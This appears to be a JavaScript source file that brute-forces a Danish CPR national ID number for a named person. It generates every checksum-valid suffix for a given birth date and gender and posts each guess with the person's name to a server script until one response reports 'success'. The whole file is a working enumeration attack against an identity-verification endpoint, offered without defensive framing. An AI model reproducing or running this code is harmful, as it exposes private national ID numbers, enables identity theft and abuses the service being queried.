var recursiveSearch;
var options,
	possibilities, 
	dob, 
	firstName, 
	lastName, 
	countRunning,
	countCompleted,
	xhr;

$(document).ready(function() {
	$('#findValidNumbers').click(function(){
	
		// reset
		options = [];
		possibilities = [];
		countRunning = 0;
		countCompleted = 0;
		xhr = [];
				
		// set date of birth
		dob = $('input[name=dob]').val();
		
		// set firstName
		firstName = $('input[name=firstName]').val();
		
		// set lastName
		lastName = $('input[name=lastName]').val();
		
		// set gender
		var gender = $('input[name=gender]:checked').val();
		findValidNumbers(dob, gender);
	});
});

function findValidNumbers(dob, gender){	

	if (dob.length != 6)	{
		alert("Invalid date of birth");
		return false;
	}

	options[0] = [1,2,3,4,9,0];
	options[1] = [0,1,2,3,4,5,6,7,8,9];
	options[2] = [0,1,2,3,4,5,6,7,8,9];		
	options[3] = gender=="male" ? [1,3,5,7,9] : [0,2,4,6,8];
	recursiveSearch ();
	console.log(possibilities.length);
}

recursiveSearch = function (number, depth )
{
	number = number || "";
	depth = depth || 0;
	for ( var i = 0; i < options[depth].length; i++ ){
		// is there one more layer?
		if ( depth +1 < options.length ){
			// yes: iterate the layer
			recursiveSearch ( number + options[depth][i] , depth +1 );
		}else{
			postCpr(number + options[depth][i] );
		}
	}
}

function postCpr(cpr){
	if(testCPR(cpr) && countRunning < 100){
		
			// count running requests
			countRunning = (countRunning + 1);
			$('#running').html(countRunning);

			possibilities.push ( cpr );
			console.log(cpr);
			xhr[countRunning] = $.post('post.php', {'cpr': cpr, 'dob':dob, 'firstName': firstName, 'lastName': lastName}, function(response){
			
				// count completed requests
				countCompleted = (countCompleted + 1);
				$('#completed').html(countCompleted);	
				
				// we found the correct number
				if(response.indexOf("success") != -1){
				
					// abort all requests
					$.each(xhr, function(key, object) { 
						if(object != undefined){
							object.abort();
							console.log(key + " aborted");
						}
					});

					$("#correctCpr").html(response);
				}
				
			});
	}
}

function getParameterByName(name, str)
{
  name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
  var regexS = "[\\?&]" + name + "=([^&#]*)";
  var regex = new RegExp(regexS);
  var results = regex.exec(str);
  if(results == null)
    return "";
  else
    return decodeURIComponent(results[1].replace(/\+/g, " "));
}

/************************
 * test for valid cpr number
 ***********************/
function testCPR(cpr){
	var fullcpr = dob + cpr;
	var sum = 0;	
	var factors = [ 4, 3, 2, 7, 6, 5, 4, 3, 2, 1 ];
	
	for (i = 0; i < 10; i++)	{
		sum += fullcpr.substring(i, i+1) * factors[i];
	}
	
	if ((sum % 11) != 0)	{
		return false;
	}	else {
		return true;
	}
}
